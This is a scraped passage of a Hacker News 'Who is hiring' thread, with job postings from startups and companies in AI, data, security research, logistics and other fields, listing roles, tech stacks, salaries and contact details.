      <center><a id="up_43243226" href="https://news.ycombinator.com/vote?id=43243226&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>PlantingSpace | Full-time | Remote (EU time zone) with quarterly gatherings | <a href="https://planting.space/" rel="nofollow">https://planting.space</a></p><p>We’re building an AI system for analysts and scientists, based on a fundamentally new approach to reasoning and knowledge representation. We go beyond state-of-the-art LLMs by combining algorithms in symbolic ways, to provide novel capabilities like performing multi-step analysis, displaying a verifiable reasoning path, and assessing uncertainty. We envision applications supporting and automating analysis and research in domains such as Finance, Strategy Consulting, Engineering, Material Sciences, and more.</p><p>Interested? We’re hiring:</p><p>* Senior Program Synthesis Engineers</p><p>* Senior Product Software Engineers</p><p>* Senior NLP Engineers</p><p>* Analytic Learning Algorithm Researcher</p><p>* Senior Product Manager (with finance background)</p><p>* Senior Finance &amp; Operations Manager</p><p>Explore our openings &amp; apply: <a href="https://planting.space/joinus/" rel="nofollow">https://planting.space/joinus/</a></p><p>Further insight into what we’re building: <a href="https://planting.space/examples/" rel="nofollow">https://planting.space/examples/</a></p><p>Questions? talent@planting.space</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243283"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243283" href="https://news.ycombinator.com/vote?id=43243283&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Uncountable | NY, SF, London &amp; Munich (In-Person) | Full-Stack Engineering <a href="https://www.uncountable.com/hiring/hn" rel="nofollow">https://www.uncountable.com/hiring/hn</a></p><p>Uncountable accelerates R&amp;D for industrial scientists across leading materials, chemicals, and life sciences organizations. With our SaaS solution, our customers get better products to the market in half the time. Uncountable was founded by MIT and Stanford engineers and has been profitable since 2016. Our team has grown from 30 to 70 over the last two years.</p><p>Full-Stack Engineers | $120k - $220k + Equity</p><p>---&gt; Uncountable is looking for engineers who can spearhead the development of the Uncountable Web Platform. The position is heavily product-driven and comes with challenges across the stack.</p><p>--&gt; Summer internships and working student positions are also available.</p><p>Learn more: <a href="https://www.uncountable.com/hiring/hn" rel="nofollow">https://www.uncountable.com/hiring/hn</a></p><p>Uncountable is hiring in New York City, San Francisco, London, and Munich.</p><p>Contact our CTO directly at jason@uncountable.com</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243612"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243612" href="https://news.ycombinator.com/vote?id=43243612&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Surge AI (<a href="https://surgehq.ai/careers" rel="nofollow">https://surgehq.ai/careers</a>) | Software Engineers (full-stack / product <a href="https://surgeai.notion.site/Product-Engineer-4211688ff99b46daacf34dd455ba3472" rel="nofollow">https://surgeai.notion.site/Product-Engineer-4211688ff99b46d...</a>) and Strategic Project Lead (<a href="https://surgeai.notion.site/Strategic-Projects-Lead-Generative-AI-455b7fb94f0d4543a00366d3154da5ec?pvs=74" rel="nofollow">https://surgeai.notion.site/Strategic-Projects-Lead-Generati...</a>) | Full-time | ONSITE SF or NYC Hybrid</p><p>Our mission at Surge is to build the human infrastructure behind the next wave of AI and LLMs. We operate a data platform that powers AI teams at OpenAI, Anthropic, Meta, Google, and more. This year, we're focused on extending our platform to support agentic workflows and help our clients ship agents that interact with the world. Here are some examples of our past work:</p><p>- Creating the GSM8K dataset: <a href="https://www.surgehq.ai/blog/how-we-built-it-openais-gsm8k-dataset-of-8500-math-problems" rel="nofollow">https://www.surgehq.ai/blog/how-we-built-it-openais-gsm8k-da...</a></p><p>- Collecting RLHF data for Anthropic's Claude: <a href="https://www.surgehq.ai/case-studies/anthropic-claude-surgeai-rlhf-platform" rel="nofollow">https://www.surgehq.ai/case-studies/anthropic-claude-surgeai...</a></p><p>You’d be joining a small, rapidly growing team of former engineering and ML leaders from Google, Meta, Twitter, and Airbnb. We work in small groups, ship quickly, and value autonomy and ownership. No previous AI experience is required, if you have the engineering skills you can learn what you need on the job.</p><p>We're looking for senior engineers to work out of our offices in SF or NYC, or remotely. Please reach out to us at careers@surgehq.ai with a resume and 2-3 sentences describing your interest. Excited to hear from you!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244149"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244149" href="https://news.ycombinator.com/vote?id=43244149&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Peregrine Technologies | Senior Software Engineer
 | San Francisco or DC - Hybrid | Full-time | $130,000 - $250,000</p><p>Peregrine exists to help public safety organizations better protect their communities and the privacy of those they serve.</p><p>Our stack is constantly evolving but based on a backend foundation of Python, Django, Celery, Airflow, and Kafka; a frontend built in React, Redux, and Mapbox; data stores including PostgreSQL and Elasticsearch; machine learning models hosted in Bedrock and Sagemaker; and with AWS, Pulumi, Terraform, and Kubernetes as our underlying infrastructure.</p><p>Engineering Roles:</p><p>Engineering Team Lead, Identity
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4517692005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Software Engineer, Foundations
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4511502005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Software Engineer, Mobile
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4437524005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Software Engineer, Apps
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4462544005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Software Engineer, Data
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4462514005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Network Engineer
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4387645005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p><p>Senior Infrastructure Engineer
<a href="https://job-boards.greenhouse.io/peregrinetechnologies/jobs/4004482005" rel="nofollow">https://job-boards.greenhouse.io/peregrinetechnologies/jobs/...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243449"><td></td></tr>
                <tr id="43243727"><td></td></tr>
                  <tr id="43243834"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243834" href="https://news.ycombinator.com/vote?id=43243834&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Comulate | Senior Engineer (3+ YoE) | ONSITE in San Francisco, CA
We're building automation software for the $7T insurance industry, accelerated by AI. Seed stage in terms of headcount (&lt; 20 people) but Series B in terms of business traction (+ cash-flow positive). We've intentionally stayed under the radar.</p><p>- Product has caused customers to literally cry tears of joy</p><p>- Experienced eng team from Airbnb / Brex / LiveRamp</p><p>- Stack: TS, Postgres, React, GraphQL, and Next.js</p><p>Apply here: <a href="https://comulate.com/careers" rel="nofollow">https://comulate.com/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243310"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243310" href="https://news.ycombinator.com/vote?id=43243310&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Honeylove (YC S18) | <a href="https://www.honeylove.com/" rel="nofollow">https://www.honeylove.com</a> | Analytics Engineer | Remote (US Only)</p><p>Come join one of the fastest growing large DTC brands. We're applying a technical and artistic approach to problems we see in the fashion industry, creating products that serve our customers of all shapes, sizes, and backgrounds.</p><p>We're looking for an Analytics Engineer to manage our data warehouse, connectors, and ETL/ELT pipelines. In addition, you'll help internal stakeholders with reporting, analysis, and other data needs.</p><p>The ideal applicant will have 2+ years experience with BigQuery, DBT, and Sigma (or similar BI platform).</p><p>Find out more or apply here: <a href="https://job-boards.greenhouse.io/honeylove/jobs/6485947003" rel="nofollow">https://job-boards.greenhouse.io/honeylove/jobs/6485947003</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243448"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243448" href="https://news.ycombinator.com/vote?id=43243448&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Altar.io | Remote in Portugal (Europe) - must live here or open to relocate | Mid + Senior Backend and fullstack | Fulltime | <a href="https://altar.io/" rel="nofollow">https://altar.io</a></p><p>Hi, Pedro, lead recruiter from Altar.io here.
We're a software house that wants its clients (early-stage startups, entrepreneurs) to thrive. We came together from various backgrounds with one vision: to bring a lean, user-centric approach to product innovation and software development by completely understanding the business needs before building anything.</p><p>Stack - node/express, angular/react, MongoDB/PostgreSQL. 
~50 strong total team, ~20 devs.</p><p>Fully remote but must be Portugal-based. (Office in Lisbon, visits are fully voluntary).</p><p>All roles at careers.altar.io
Comprehensive FAQ at careers.altar.io/#faq</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43243538"><td></td></tr>
                  <tr id="43243142"><td></td></tr>
            <tr id="43243071"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243071" href="https://news.ycombinator.com/vote?id=43243071&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>C.H. Robinson | Lead Data Scientist | $129.9K - $216K | ONSITE (hybrid) | Minneapolis</p><p>I'm currently hiring a lead data scientist to work on our North American Surface Transportation (NAST) truckload pricing team. C.H. Robinson is among the worlds largest freight brokerages with NAST executing on ~11 Billion in revenue in 2024. This role will be crucial in optimizing the carrier pricing for our two-sided marketplace.</p><p>The work is challenging and fast-paced with direct responsibility for production systems. Applicants should have a good intuition for pragmatic simple solutions, a strong ability to iterate and a compulsive attention to outcomes. Come do creative high-impact modeling work in a complex and dynamic marketplace.</p><p>Note that you found this role via hn in your application.
<a href="https://www.chrobinson.com/en-gb/about-us/careers/jobs/eden-prairie/lead-data-scientist/r43756/" rel="nofollow">https://www.chrobinson.com/en-gb/about-us/careers/jobs/eden-...</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243374"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243374" href="https://news.ycombinator.com/vote?id=43243374&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Stack Influence | Multiple Roles: QA, Technical Operations, Full Stack JavaScript Engineer | Full-time | Remote (Global)</p><p>We’re a VC-funded, fully-remote, high-growth creator marketplace connecting eCommerce brands with everyday social media users.</p><p>• Senior Full Stack JavaScript Engineer ($120-160k): Modern tech stack React, Node.js, Next.js, and Azure. Individual contributor on small team, no mentoring duties and 4-day work week.</p><p>• Senior QA Engineer &amp; Analyst ($75-100k): Hybrid business analyst and manual web app testing role.</p><p>• Technical Product Operations Lead ($100-150k): Data-driven operations with expert SQL, analytics, and integration skills. Business-minded engineers desired.</p><p>APPLY --&gt; <a href="https://stack-influence.breezy.hr/" rel="nofollow">https://stack-influence.breezy.hr/</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243378"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243378" href="https://news.ycombinator.com/vote?id=43243378&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Foxglove | Remote (U.S. time zones) | Full Time or Contract | <a href="https://foxglove.dev/" rel="nofollow">https://foxglove.dev/</a></p><p>Foxglove is the leading observability platform for robotics developers. We help robotics and autonomous vehicle companies log, store, and visualize multimodal data. We're well funded (Series A, ~30 people), and assembling the most talented team in the industry to build a unified cloud platform for all robots. Sound interesting? Join us!</p><p>* Must be based in U.S. or Canada for these roles *</p><p>- Staff Product Designer</p><p>- Staff Visual Designer (apply through the PD role for now, or email me)</p><p>- Account Executive (Automotive)</p><p>- Account Executive (Defense - must be U.S. citizen)</p><p>- Customer Success Engineer</p><p><a href="https://foxglove.dev/careers" rel="nofollow">https://foxglove.dev/careers</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243241"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243241" href="https://news.ycombinator.com/vote?id=43243241&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Modash.io | Senior Data Engineer, Senior Product Engineer and more | Full-time | Remote (EU timezones ±2 hours)</p><p>Our goal?</p><p>To help brands and creators create awesome connections with their target audiences using data-driven influencer marketing magic . With our tech and savvy data analysis, we're giving our clients the insights and tools they need to knock their marketing campaigns out of the park!</p><p>Our tech stack is:</p><p>- Backend: Typescript, Python</p><p>- Frontend: Vue</p><p>- Infra: Pulumi, AWS</p><p>Interview Process?</p><p>Say goodbye to pineapple tree sorting and Leetcode-style tasks! Our interviews are all about practical challenges and real-world scenarios, so you can showcase your skills in the most relevant way possible.</p><p>All roles we have, including non-engineering ones: <a href="https://apply.workable.com/modash/" rel="nofollow">https://apply.workable.com/modash/</a></p><p>Don't forget to mention that you came from HN in your application!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244703"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244703" href="https://news.ycombinator.com/vote?id=43244703&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Felt Clinic (<a href="https://feltclinic.com/" rel="nofollow">https://feltclinic.com</a>) | Mobile-First Full Stack Engineer | San Francisco, CA, USA or REMOTE in USA | $180k-$200k</p><p>Felt is building the first embedded care SDK for health apps. Our mission is to make access to a doctor simple and secure inside any mobile application. We want teams to stop worrying about provider contracting and focus on building awesome experiences.</p><p>If you are exceptional at building products and want to join a company moving the healthcare industry forward, Felt Clinic is a great fit for you. We have three signed customers in deployment of embedded care into their apps. With just these customers we are expecting about 1 million active users in late 2024. And to be profitable in 2025. We raised a seed round from 1984, Scrum Ventures and DigitX recently to accelerate our growth.</p><p>TL;DR - Build HealthKit on steroids with us.</p><p>Technologies that we use or implement: iOS, Android, Next/React, Ionic, Typescript, SwiftUI, Kotlin, Vercel, Framer, WebRTC Apply here: sid (at) feltclinic.com</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243034"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243034" href="https://news.ycombinator.com/vote?id=43243034&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>SluiceboxAI | Back-End / Full-Stack Engineer | Austria (Remote) | Full-Time</p><p>We're building automation-driven sustainability intelligence for manufacturers. Companies use our platform to navigate compliance, reduce emissions, and drive transparency. We're a fast-moving startup where engineers help define solutions, not just build features.</p><p>The Role:</p><p>- Own &amp; build scalable back-end solutions (APIs, databases, automation).</p><p>- Work across the stack—back-end focused, but some front-end when needed.</p><p>- Product thinking: Define &amp; solve problems, not just execute tickets.</p><p>- Tech: Python (preferred), PostgreSQL, API design, test automation.</p><p>- Startup pace—figure out solutions independently.</p><p>Who We're Looking For:</p><p>- Strong back-end experience (Python, databases, automation).</p><p>- Comfort with ambiguity—able to operate in a fast-moving startup.</p><p>- End-to-end ownership mindset—you'll help shape solutions.</p><p>- Nice-to-haves: AI/ML interest, test automation, scaling experience.</p><p>Why Join?</p><p>- No red tape—just solving real problems.</p><p>- End-to-end ownership—your work directly impacts customers.</p><p>- Move fast—engineering drives the company.</p><p>Interested? Apply at ihsan@sluicebox.ai or DM me here!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244244"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244244" href="https://news.ycombinator.com/vote?id=43244244&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>bloop (YC S21) | Software Engineer (Rust, AI); Compiler Engineer (Rust, Static Analysis) | Onsite London, UK (Visa Sponsor)</p><p>We're combining LLMs and transpilers to translate COBOL into Java. If you’re a Rust developer with experience working with AI and/or compilers, this role could be a great fit. Come and build LLM pipelines and agents that help the largest companies modernise their legacy codebases.</p><p>Please email join [at] bloop [dot] ai with "HN Software Engineer" or "HN Compiler Engineer" in the subject line.</p><p>More details - <a href="https://www.ycombinator.com/companies/bloop/jobs">https://www.ycombinator.com/companies/bloop/jobs</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244002"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244002" href="https://news.ycombinator.com/vote?id=43244002&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Letta | Multiple Roles | Onsite 5 days a week - San Francisco| Full-time | <a href="https://www.letta.com/" rel="nofollow">https://www.letta.com/</a>| $150k-250k + Equity</p><p>Letta (fka MemGPT) is a open source agent development suite with three products, our open source agentic framework, our long-term stateful memory algorithm (and research) and a cloud and local agent development environment UI. We're popular with developers, hosting an active community of 1000+ on our discord and are now focusing on our cloud and onprem support. We have a few live customers behind our cloud, and are looking for engineers to help us scale for a GA and more onprem deployments.</p><p>Roles:</p><p>* Product Engineer - (Typescript, NextJS) - Help work on our cloud services and desktop apps!</p><p>* Platform Engineer - (Typescript, Python, K8s) - Help bring Letta to the world both on cloud and onprem with extreme performance and beautiful DX</p><p>* Software Engineer/Research Engineer (Python) - Work on improving our open source and explore new ways how we can improve agentic AI</p><p>* Research Scientist - Design and execute our R&amp;D strategy for improving our core LLM tech</p><p>We are mostly hiring mid level and senior+staff level. But if you feel compelled, it never hurts to apply :)</p><p>Perks: Equity, Salary, Free Lunch, Transit Reimbursement, Gym Reimbursement, 401k</p><p>Apply by visiting: <a href="https://jobs.ashbyhq.com/letta" rel="nofollow">https://jobs.ashbyhq.com/letta</a></p><p>Or for the product engineer role, email me at shub at letta.com</p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="43244667"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_43244667" href="https://news.ycombinator.com/vote?id=43244667&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div>
                  <p>I live in the EU so this job is definitely not for me. I wonder though how bad is your rep that got you downvoted (the font looks pretty grey on my phone - a stark comparison from the other ads' bright white font colors)</p>
              </div></td></tr>
        </tbody></table></td></tr>
                  <tr id="43243093"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243093" href="https://news.ycombinator.com/vote?id=43243093&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Zetier | Multiple US locations (VA, PA, FL, TX, CA, NY) | ONSITE | Full-Time</p><p>Zetier develops real-world tools and capabilities to secure our nation in the short- and long-term. If you’re excited to delve deep into low-level systems, exploit dev, and more alongside a group of passionate hackers, then we’d love to hear from you.</p><p>We’re looking to find the right people for a range of roles, including:</p><p>- Vulnerability Researcher</p><p>- Android Security Engineer</p><p>- CNO Embedded Engineer</p><p>- CNO Software Engineer</p><p>- Senior Tech Lead</p><p>- Business Developer</p><p>All open positions: <a href="https://zetier.breezy.hr/" rel="nofollow">https://zetier.breezy.hr/</a></p><p>Our approach and benefits: <a href="https://zetier.com/careers/" rel="nofollow">https://zetier.com/careers/</a></p><p>Different skill set? Drop us a line at hello@zetier.com</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243189"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243189" href="https://news.ycombinator.com/vote?id=43243189&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Ivo | SF (In-Person) | Software Engineer</p><p>Ivo (www.ivo.ai) is an AI legal assistant for reviewing and redlining contracts more efficiently — although we primarily serve lawyers, we think we can eventually remove lawyers from contracting processes entirely. Our customers include companies like Zapier, Canva, Quora, and WordPress.</p><p>We recently raised our Series A from Costanoa Ventures, NFDG, Uncork Capital, Fika Ventures, and more.</p><p>Email me at jacob@ivo.ai if you're interested!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243319"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243319" href="https://news.ycombinator.com/vote?id=43243319&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>iPify | Legal Tech | Remote Europe or UK | Full Time | Data Engineer with a focus on web scraping</p><p>Are you passionate about data and looking to make a significant impact in a growing startup? Join us at iPify, where we are seeking a skilled and motivated Data Engineer to help us liberate public information.</p><p>Operating globally, we encounter unique challenges related to intellectual property (IP) data, offering an ocean of opportunities. Your role will be to develop web spiders for all kinds of public information sources, enabling us to verify customer data with scraped information and ultimately provide services for our customers with a high level of accuracy, trust, and automation.</p><p>Job description: <a href="https://www.notion.so/ipify/Data-Engineer-5f8671165d9d4b00859c3a1340453803" rel="nofollow">https://www.notion.so/ipify/Data-Engineer-5f8671165d9d4b0085...</a></p><p>Company website: <a href="https://www.ipify.app/" rel="nofollow">https://www.ipify.app/</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243668"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243668" href="https://news.ycombinator.com/vote?id=43243668&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>Gigs | Multiple US &amp; EU Locations (SF, NYC, Berlin, London) | REMOTE | Full-time</p><p>At Gigs, we're building the operating system for mobile services - a platform that enables tech companies to seamlessly embed connectivity into their products.</p><p>We've just raised a substantial Series B and are looking for exceptional candidates across a wide range of roles:</p><p>- Senior Backend Engineer(s)
- Senior Full Stack Engineer (s)
- Strategic Account Manager 
- Go to Market Associate
- Business Development Manager(s)
- Marketing Lead(s)</p><p>To review all open roles and benefits, go visit our career page <a href="https://gigs.com/careers">https://gigs.com/careers</a></p><p>Questions? reach out to thibaut@gigs.com</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243792"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243792" href="https://news.ycombinator.com/vote?id=43243792&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>yeet | Chicago, IL / Remote | Full-Time</p><p>Building a dynamic runtime on top of the Linux BPF sub-system. Looking for extremely talented / passionate Rust developers with a deep interest in Linux internals, Dev Tools, Great Developer Experiences and Systems programming. Experience writing highly-concurrent, performant multi-threaded Rust is a must.</p><p>Feel free to tell us all about your favorite GNU core utilities / Linux system calls / kernel sub-systems at:</p><p>work [at] yeet.cx</p><p>You can try our sandbox at <a href="https://yeet.cx/play" rel="nofollow">https://yeet.cx/play</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243217"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243217" href="https://news.ycombinator.com/vote?id=43243217&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>iwell (scale-up) | <a href="https://www.iwell.eu/" rel="nofollow">https://www.iwell.eu/</a> | Medior/senior data engineer | Utrecht, Netherlands | Full Time | Onsite/Hybrid</p><p>We're looking for an experienced data engineer to join our friendly group of 6 data &amp; battery nerds. I'm Tanja, a data engineer and people lead of the data team; feel free to ask questions here or email(in bio) me!</p><p>We build software that uses real-time telemetry, forecasts, and battery solutions to optimize energy flows for businesses. My team handles data from thousands of devices to power customer facing products, analytics and ML. Aside from that, we love karaoke, pub quizzes and (board)games.</p><p>Relevant stack: GCP, Airflow, InfluxDB, Python, BigQuery</p><p>Full description and apply here:
<a href="https://jobs.iwell.nl/o/data-engineer-medior-senior" rel="nofollow">https://jobs.iwell.nl/o/data-engineer-medior-senior</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243687"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243687" href="https://news.ycombinator.com/vote?id=43243687&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>supersonik.ai | Founding Software Engineers | ONSITE Barcelona (we help relocate), REMOTE (exceptional cases) | Full-time</p><p>We just raised a $5M seed from a top-tier fund to build real-time AI agents that interact through voice and complex UI automation. The technical challenges are really big. We're hiring founding engineers: people who love coding, hacking, and building hard things from scratch.</p><p>You'll join early, have ownership from day one, and work alongside a team in Barcelona (we'll help you move). Remote is possible, but only for extraordinary cases.</p><p>If this sounds like your kind of challenge, email us: hiring at supersonik.ai</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243044"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243044" href="https://news.ycombinator.com/vote?id=43243044&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>iGenius.ai | Senior AI/Software Engineer, MLOps Engineer, Senior AI Research Scientist and more | Full-time | Remote (US, Italy)</p><p>We recently released our biggest model yet, Colosseum-355B (MMLU 5-shot: 82.04), and we've become the first AI Unicorn in Italy, last summer.</p><p>We're also creating our own $1B supercomputer of 115 exaflops (FP4), around summer 2025. <a href="https://www.reuters.com/technology/artificial-intelligence/i" rel="nofollow">https://www.reuters.com/technology/artificial-intelligence/i</a>...</p><p>Our goal is to enable anyone to explore company data and ask business questions in natural language. We are committed to making data analysis accessible, secure, and private, supporting businesses in highly regulated sectors.</p><p>Our tech stack is</p><p>- Backend: Python (FastAPI), Typescript (Fastify)</p><p>- Frontend: React, Swift/Kotlin</p><p>- Infra: K8s, Terraform</p><p>All open roles @ <a href="https://apply.workable.com/igenius/" rel="nofollow">https://apply.workable.com/igenius/</a></p><p>Don't forget to mention that you came from HN in your application!</p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43243315"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43243315" href="https://news.ycombinator.com/vote?id=43243315&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>broadn | Full-Stack Engineer | Typescript+Javascript + Nodejs | ONSITE in NYC,US | Fulltime</p><p>broadn (broadn.io) is an AI-native CPQ (Configure, Price, Quote) platform that helps manufacturers, suppliers, and distributors create quotes and RFQs as fast as possible. Our platform handles large product catalogs (20K+ SKUs) and complex product configurations. We are backed by SV investors.</p><p>You'll be the 2nd engineer and working directly with the CTO and CEO.</p><p>Apply here: <a href="https://broadn.notion.site/1a9d7894dd55809eb4a2f6cd6bea10cc" rel="nofollow">https://broadn.notion.site/1a9d7894dd55809eb4a2f6cd6bea10cc</a></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="43244141"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_43244141" href="https://news.ycombinator.com/vote?id=43244141&amp;how=up&amp;goto=item%3Fid%3D43243024"></a></center>    </td><td><br><div><p>RINSE | REMOTE or San Francisco, Los Angeles, Chicago, Boston, New York, New Jersey, Seattle, Austin, Dallas, or Washington DC | Software Engineer, Product Manager, Marketing Manager, Business Development Representative | Full-Time | <a href="https://www.rinse.com/" rel="nofollow">https://www.rinse.com</a></p><p>Rinse provides dry cleaning and laundry delivery services to customers in nine metropolitan areas in the US. We have sophisticated logistics optimization software, a polished consumer product, and firm business fundamentals. We're now over a decade old - this is a stable, yet consistently growing and innovating, company.</p><p>Our engineering team is distributed across the United States and internationally, and has been entirely remote for years now, but a desk can be provided in the above cities if you'd prefer.</p><p>We're open to both newly-graduated engineers or more senior engineers, provided they meet our bar. We're particularly interested in true full-stack engineers, with strong React / Typescript / CSS skills to complement comfort in a Python / Django environment.</p><p>Search term bingo: Logistics, Django, Python, Optimization, React, React Native, Postgres, Mobile Engineer, Tailwind</p><p><a href="https://www.rinse.com/careers/software-engineer/" rel="nofollow">https://www.rinse.com/careers/software-engineer/</a></p><p>-----------------------------------------------</p><p>We're also hiring a Product Manager:</p><p>Our product team is distributed across the United States and internationally, and has been entirely remote for years now, but a desk can be provided in the above cities if you'd prefer. Our product managers enjoy a high level of integration with our engineering team, and our open culture ensures a high degree of collaboration with marketing and operations functions. We're built to get things done.</p><p>We're looking for a mid-career product manager to join our product management team to drive our customer-facing, valet-facing, and cleaning-facing products forward. The ideal candidate has a few years' experience at a consumer services company, with both analytical skill and qualitative insight into consumer behavior. Come and take our company to the next level!</p><p>Search term bingo: Logistics, Delivery, Growth, Analytics, Funnel, B2C, SaaS, Marketplace</p><p><a href="https://www.rinse.com/careers/product-manager/" rel="nofollow">https://www.rinse.com/careers/product-manager/</a></p><p>Interested? Email us as 